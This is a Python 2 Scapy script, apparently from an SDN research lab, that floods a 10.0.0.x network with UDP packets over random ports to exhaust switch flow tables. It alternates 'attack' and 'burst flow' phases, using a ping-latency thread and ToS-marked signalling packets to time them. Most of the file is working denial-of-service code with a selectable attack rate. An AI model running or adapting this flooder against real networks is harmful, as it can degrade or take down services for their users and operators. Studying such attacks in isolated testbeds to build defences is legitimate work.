from scapy.all import *
import random
import time 
import datetime 
import socket
import fcntl
import struct
import select
import threading
import asyncore

ICMP_ECHO_REQUEST = 8 # Platform specific
DEFAULT_TIMEOUT = 2
DEFAULT_COUNT = 4 

global CURRENT_TIME
global REACH 
global STOP
LOCK = threading.Lock()

class Pinger(object):
    """ Pings to a host -- the Pythonic way"""
    
    def __init__(self, target_host, count=DEFAULT_COUNT, timeout=DEFAULT_TIMEOUT):
        self.target_host = target_host
        self.count = count
        self.timeout = timeout


    def do_checksum(self, source_string):
        """  Verify the packet integritity """
        sum = 0
        max_count = (len(source_string)/2)*2
        count = 0
        while count < max_count:
            val = ord(source_string[count + 1])*256 + ord(source_string[count])
            sum = sum + val
            sum = sum & 0xffffffff 
            count = count + 2
     
        if max_count<len(source_string):
            sum = sum + ord(source_string[len(source_string) - 1])
            sum = sum & 0xffffffff 
     
        sum = (sum >> 16)  +  (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff
        answer = answer >> 8 | (answer << 8 & 0xff00)
        return answer
 
    def receive_ping(self, sock, ID, timeout):
        """
        Receive ping from the socket.
        """
        time_remaining = timeout
        while True:
            start_time = time.time()
            readable = select.select([sock], [], [], time_remaining)
            time_spent = time.time() - start_time
            if readable[0] == []: # Timeout
                return
     
            time_received = time.time()
            recv_packet, addr = sock.recvfrom(1024)
            icmp_header = recv_packet[20:28]
            type, code, checksum, packet_ID, sequence = struct.unpack(
                "bbHHh", icmp_header
            )

            time_remaining = time_remaining - time_spent
            if time_remaining <= 0:
                return
            #xiu gai zhi xing shun xu 
            if packet_ID == ID:
                bytes_In_double = struct.calcsize("d")
                time_sent = struct.unpack("d", recv_packet[28:28 + bytes_In_double])[0]
                return time_received - time_sent
     

     
     
    def send_ping(self, sock,  ID):
        """
        Send ping to the target host
        """
        target_addr  =  socket.gethostbyname(self.target_host)
     
        my_checksum = 0
     
        # Create a dummy heder with a 0 checksum.
        header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
        bytes_In_double = struct.calcsize("d")
        data = (192 - bytes_In_double) * "Q"
        data = struct.pack("d", time.time()) + data
     
        # Get the checksum on the data and the dummy header.
        my_checksum = self.do_checksum(header + data)
        header = struct.pack(
            "bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1
        )
        packet = header + data
        sock.sendto(packet, (target_addr, 1))
     
     
    def ping_once(self):
        """
        Returns the delay (in seconds) or none on timeout.
        """
        icmp = socket.getprotobyname("icmp")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        except socket.error, (errno, msg):
            if errno == 1:
                # Not superuser, so operation not permitted
                msg +=  "ICMP messages can only be sent from root user processes"
                raise socket.error(msg)
        except Exception, e:
            print "Exception: %s" %(e)
    
        my_ID = os.getpid() & 0xFFFF
     
        self.send_ping(sock, my_ID)
        delay = self.receive_ping(sock, my_ID, self.timeout)
        sock.close()
        return delay
     
     
    def ping(self):
        """
        Run the ping process
        """
        time_list = []
        for i in xrange(self.count):
            #print "Ping to %s..." % self.target_host,
            try:
                delay  =  self.ping_once()
            except socket.gaierror, e:
                print "Ping failed. (socket error: '%s')" % e[1]
                break
     
            if delay  ==  None:
                print "Ping failed. (timeout within %ssec.)" % self.timeout
                return None
            else:
                delay  =  delay * 1000
                time_list.append(delay)
                #print "Get pong in %0.4fms" % delay
        time_count = 0
        for i in time_list:
            time_count = time_count+i
        result =  time_count/self.count
        #print time_count
        #print result
        return result  
###################################################################
  
def get_ip_address(ifname):# get host ip
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def test_reach(dst_ip):
    ans = sr1(IP(dst=dst_ip)/ICMP())
    #ans.show()
    print ans[0]

    if ans:
        print " get an answer"
        print ans[ICMP]
        if (ans[ICMP].type == 0):
            print "dst_ip is reachable"
    else:
        print "dst_ip is unreachable"  

def get_dest_ip(host_ip):
    while 1:
        d = random.randint(1,20)
        dst_ip = "10.0.0."+str(d) 
        if dst_ip != host_ip:
            #print "host_ip is",host_ip
            #print "dst_ip is",dst_ip
            break
    return dst_ip
def get_src_ip():
    a  = random.randint(0,9)
    b  = random.randint(0,255)
    c  = random.randint(0,255)
    d  = random.randint(0,255)
    return str(a)+"."+str(b)+"."+str(c)+"."+str(d)

def attack_more_flowtable(host_ip,rest_time,ip_mac):
    #time_list = []
    fo = open(os.getcwd()+"/"+host_ip+"_attack.txt","a+")
    fo.write(str(time.ctime()))
    #print time.ctime()
    for i in range(0,10):
        #src_ip = RandIP()
        #src_ip = get_src_ip()
        src_ip = host_ip
        dst_ip = get_dest_ip(host_ip)
        #src_mac = RandMAC()
        dst_mac = ip_mac.get(dst_ip)
        pkt_len = random.randint(500,1200)
        ip_packet = Ether(dst = dst_mac)/IP(len = pkt_len,src= src_ip,dst = dst_ip)/UDP(sport =random.randint(1,65525), dport = (100,600))/("i"*pkt_len)
        udp_packet = Ether(dst = dst_mac)/IP(len = pkt_len,src= src_ip,dst = dst_ip)/UDP(sport =random.randint(1,65525), dport = (100,600))/("i"*pkt_len)
        sendp(ip_packet)
        sendp(udp_packet)
        time.sleep(rest_time)
    fo.write(str(time.ctime()))
    fo.close()
    print time.ctime()
    '''
        time_list.append(Pinger(dst_ip).ping())
    count = 0
    for i in time_list:
        count = count +i
    return count/40

    '''
def burst_flow(host_ip,rest_time,ip_mac):
    
    for i in range(0,5):
        #src_ip = get_src_ip()
        src_ip = host_ip
        dst_ip = get_dest_ip(host_ip)
        #src_mac = RandMAC()
        dst_mac = ip_mac.get(dst_ip)
        pkt_len = random.randint(500,1200)
        #ip_packet = Ether(src=src_mac,dst = dst_mac)/IP(len = pkt_len,src= src_ip,dst = dst_ip)/UDP(sport =random.randint(1,65525), dport = (100,300))/("i"*pkt_len)
        #udp_packet = Ether(src=src_mac,dst = dst_mac)/IP(len = pkt_len,src= src_ip,dst = dst_ip)/UDP(sport =random.randint(1,65525), dport = (100,300))/("i"*pkt_len)
        ip_packet = Ether(dst = dst_mac)/IP(len = pkt_len,src= src_ip,dst = dst_ip)/UDP(sport =random.randint(1,65525), dport = (100,300))/("i"*pkt_len)
        udp_packet = Ether(dst = dst_mac)/IP(len = pkt_len,src= src_ip,dst = dst_ip)/UDP(sport =random.randint(1,65525), dport = (100,300))/("i"*pkt_len)
        sendp(ip_packet,inter=0.04)
        sendp(udp_packet,inter=0.04)
    #sendp(Ether(src =ip_mac.get(host_ip),dst = ip_mac.get("10.0.0.3"))/IP(src=host_ip,dst = "10.0.0.3",tos = 10)/ICMP())    

def attack_with_loop_control(host_ip,rest_time,ip_mac):

    time_limit_high = 9
    time_limit_low = 6
    global CURRENT_TIME
    global REACH 
    global STOP
    CURRENT_TIME = 8
    REACH = True
    flag1 = 0
    flag2 = 0
    while 1:
        tcp_packet = Ether(dst = ip_mac.get("10.0.0.3"))/IP(src=host_ip,dst = "10.0.0.3",tos = 30)/UDP(sport = 1080,dport = 443)
        sendp(tcp_packet)
        attack_times = 0
        while flag1==0:
            print "--------------------------------------------------------"
            print " begin attack "+str(time.ctime())
            fin = open(os.getcwd()+"/"+host_ip+"_action.txt","a+")
            fin.write("\nAttack start at: \n")
            fin.write(str(time.ctime()))
            fin.write("============>");
            fin.close()
            attack_more_flowtable(host_ip,rest_time,ip_mac)
            attack_times = attack_times+1
            if attack_times >1:
                #EndAttack();
                sendp(Ether(dst = ip_mac.get("10.0.0.3"))/IP(src=host_ip,dst = "10.0.0.3",tos = 20)/ICMP())
                flag1 = 1
                flag2 = 0
                print "--------------------------------------------------------"
                print "end attack "+ str(time.ctime())
                fin=open(os.getcwd()+"/"+host_ip+"_action.txt","a+")
                fin.write(str(time.ctime()))
                fin.write("\nAttack End\n\n")
                fin.close()

            LOCK.acquire()
            print " step2"
            STOP = False
            if flag1==0 and CURRENT_TIME<time_limit_high and REACH == True:
                LOCK.release()
                sendp(Ether(dst = ip_mac.get("10.0.0.3"))/IP(src=host_ip,dst = "10.0.0.3",tos = 20)/ICMP())
                flag1 = 1
                flag2 = 0
                print "--------------------------------------------------------"
                print "end attack "+ str(time.ctime())
                fin=open(os.getcwd()+"/"+host_ip+"_action.txt","a+")
                fin.write(str(time.ctime()))
                fin.write("\nAttack End\n\n")
                fin.close()
            else:
                LOCK.release()
            
        while flag2==0:
            print "--------------------------------------------------------"
            time.sleep(1)
            print "burst flow begin "+str(time.ctime())
            fin=open(os.getcwd()+"/"+host_ip+"_action.txt","a+")
            fin.write("\nProbe at :\n ")
            fin.write(str(time.ctime()))
            fin.write("------------->")
            fin.close()
            
            sendp(Ether(dst= ip_mac.get("10.0.0.3"))/IP(src=host_ip,dst = "10.0.0.3",tos = 25)/UDP(sport = 1080,dport = 443))
            burst_flow(host_ip,rest_time,ip_mac)
            sendp(Ether(dst = ip_mac.get("10.0.0.3"))/IP(src=host_ip,dst = "10.0.0.3",tos = 10)/ICMP())  
            LOCK.acquire()
            STOP = True
            #if CURRENT_TIME>time_limit_low and CURRENT_TIME<time_limit_high and REACH == True:
            if CURRENT_TIME>time_limit_low and REACH == True:
                LOCK.release()
                flag2 = 1
                flag1 = 0
                print "--------------------------------------------------------"
                print "burst flow end"+str(time.ctime())
                fin=open(os.getcwd()+"/"+host_ip+"_action.txt","a+")
                fin.write(str(time.ctime()))
                fin.write("\nProbe End\n\n")
                fin.close()
            else:
                LOCK.release()
            

def get_mac(src_ip,dst_ip):
    arp_packet = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(psrc = src_ip,pdst = dst_ip)
    ant= srp1(arp_packet)
    return  ant.hwsrc

def attack_rate(rate):
    if rate == 1:
        rest_time = 1
    elif rate == 2:
        rest_time = 0.3
    elif rate == 3:
        rest_time=0.133
    elif rate== 4:
        rest_time=0.05
    else:
        rest_time=0
    return rest_time
def ping_test(host_ip):
    global CURRENT_TIME
    global REACH
    global STOP 
    STOP = False
    path = os.getcwd()+"/"+host_ip+"ping_test.txt"
    fo = open(path,"a+")
    time_list = []
    time_sum = 0.000000
    while 1:
        #threading.Condition().acquire()
        if STOP == False:
            LOCK.acquire()
            CURRENT_TIME = Pinger(get_dest_ip(host_ip)).ping()
            LOCK.release()
            if CURRENT_TIME == None:
                REACH = False
            else:
                REACH = True
            fo.write(time.ctime()+" "+str(CURRENT_TIME)+"\n")
            time.sleep(0.1)
        elif STOP == True:
            LOCK.acquire()
            CURRENT_TIME = Pinger(get_dest_ip(host_ip)).ping()
            LOCK.release()
            if CURRENT_TIME == None:
                REACH = False
            else:
                REACH = True
            fo.write(time.ctime()+" "+str(CURRENT_TIME)+"\n")
            time.sleep(0.1)
########################################################################
#dst_ip = raw_input("please input a ip address you want to attack:")
#test whether it can each dst ip
'''
#can;t get right ip address just 127.0.1.1?
hostname = socket.getfqdn(socket.gethostname(  ))
print hostname
host_ip = socket.gethostbyname(hostname)
'''
if __name__ == '__main__':

    '''
    for i in sys.argv:
        print i
    '''
    ether_name = sys.argv[1]+"-eth0"
    rest_time = attack_rate(int(sys.argv[2]))
    #time.sleep(1)
    #rate = raw_input("please input attack rate you want:")
    #ether_name = raw_input("please input host name:")+"-eth0"
    host_ip = get_ip_address(ether_name)
    mac_list = []
    ip_list = []
    ip_mac = {}
    for i in range(1,21):
        dst_ip = "10.0.0."+str(i)
        if dst_ip !=  host_ip:
            #ip_list.append(dst_ip)
            ip_mac.setdefault(dst_ip,get_mac(host_ip,dst_ip))
    #print ip_mac
    #print host_ip
    #time.sleep(30,50)
    #time.sleep(random.randint(30,50))
    therads = []
    t1 = threading.Thread(target =ping_test,args=(host_ip,))
    t2 = threading.Thread(target = attack_with_loop_control,args =(host_ip,rest_time,ip_mac))
    therads.append(t1)
    therads.append(t2)
    for j in therads:
        j.setDaemon(True)
        j.start()
    for j in therads:
        j.join()
    #attack_with_time_control(host_ip,rest_time,ip_mac) 
    #attack(host_ip,rest_time,ip_mac)
    #attack_more_flowtable(host_ip,rest_time,ip_mac)

    #rest_time = int((1-rate*0.2)/rate*100)
    #rest_time = rest_time/100
    print host_ip,rest_time

